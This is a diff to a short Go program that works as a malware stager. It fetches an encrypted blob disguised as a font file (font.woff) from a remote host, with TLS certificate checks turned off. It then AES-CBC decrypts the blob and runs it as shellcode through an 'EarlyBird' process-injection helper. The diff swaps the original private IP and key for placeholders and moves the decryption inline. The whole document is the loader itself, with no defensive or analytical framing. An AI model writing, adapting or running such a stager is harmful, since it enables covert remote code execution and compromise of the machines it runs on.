@@ -1,18 +1,23 @@
 package main
 
 import (
+	
+	"crypto/aes"
+	"crypto/cipher"
+	
 	"crypto/tls"
 	"fmt"
 	"io"
 	"net/http"
 
-	"stager/run"
+	"github.com/3santree/go-shellcode-helper/cmd/EarlyBird"
 )
 
 func main() {
-	url := "https://192.168.122.62/font.woff"
-	key := []byte("sAYx2sgB3QglfexI")
-
+	url := "https://123.com/font.woff"
+	
+	key := []byte("1234")
+	
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
@@ -25,7 +30,20 @@ func main() {
 	if err != nil {
 		fmt.Println(err)
 	}
+	
+	sc := decrypt(body[16:], key, body[:16])
+	
+	EarlyBird.Run(sc)
+}
 
-	sc := run.Decrypt(body[16:], key, body[:16])
-	run.ThreadRun(sc)
+func decrypt(data, key, iv []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println("blocksize: ", block.BlockSize())
+	fmt.Println("ivsize: ", len(iv))
+	mode := cipher.NewCBCDecrypter(block, iv)
+	mode.CryptBlocks(data, data)
+	return data
 }
